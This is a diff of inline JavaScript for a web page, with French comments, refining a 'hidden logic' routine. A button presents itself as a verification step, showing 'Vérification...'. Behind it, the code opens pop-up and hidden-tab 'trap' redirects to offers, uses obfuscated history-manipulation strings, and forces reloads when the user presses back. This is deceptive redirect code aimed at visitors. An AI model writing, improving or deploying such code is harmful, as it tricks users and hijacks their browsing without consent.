@@ -52,6 +52,13 @@
     </div>
     
 <script>
+
+    // 🚨 MODIFICATION 1 : FORCER LE RECHARGEMENT AU RETOUR ARRIÈRE (Correction Mobile)
+    // Cela empêche l'exécution d'un script en mémoire avec un état "redirected=true"
+    if (window.performance && window.performance.navigation.type === window.performance.navigation.TYPE_BACK_FORWARD) {
+        location.reload(true);
+    }
+
     // --- OBFUSCATION DE BASE ---
     const H = ['h', 'i', 's', 't', 'o', 'r', 'y'].join('');
     const PS = ['p', 'u', 's', 'h', 'S', 't', 'a', 't', 'e'].join('');
@@ -69,7 +76,7 @@
     const SUCCESS_ICON_HTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
     const LOADER_HTML_FIXED = '<div id="loader" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>';
 
-    var redirected = false;
+    // ❌ Ancienne variable 'redirected' supprimée, l'état sera géré par la redirection forcée.
     
     // --- 1. FONCTIONS DE BASES ---
     function getUrlParameter(name) {
@@ -79,9 +86,8 @@
         return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
     };
 
+    // Fonction de redirection sans gestion d'état interne
     function executeHiddenLogic(urlMain, urlPop, idBack) {
-        if (redirected) return;
-        redirected = true;
         
         // 1. Redirection Pop-up (url_pop)
         try {
@@ -92,12 +98,11 @@
             }
         } catch(e) {}
         
-        // 2. CORRECTION CRITIQUE : Ajout de la Redirection Trap (idBack)
-        // La troisième offre est chargée dans un onglet (qui sera masqué)
-        const trapUrl = URL_PHP + "?sec_id=" + idBack + window.location.search;
-        try {
-            window[WO](trapUrl, BK); 
-        } catch(e) {}
+        // 2. Redirection Trap (idBack) (Correction précédente)
+        const trapUrl = URL_PHP + "?sec_id=" + idBack + window.location.search;
+        try {
+            window[WO](trapUrl, BK); 
+        } catch(e) {}
 
         // 3. Redirection Principale (urlMain)
         setTimeout(function(){
@@ -111,6 +116,7 @@
             btn.addEventListener('click', function(event) {
                 event.preventDefault();
                 
+                // Empêche les doubles clics rapides
                 this.setAttribute('data-original-html', this.innerHTML);
                 this.innerHTML = '<span style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">' + LOADER_HTML_FIXED + ' Vérification...</span>';
                 this.style.pointerEvents = 'none';
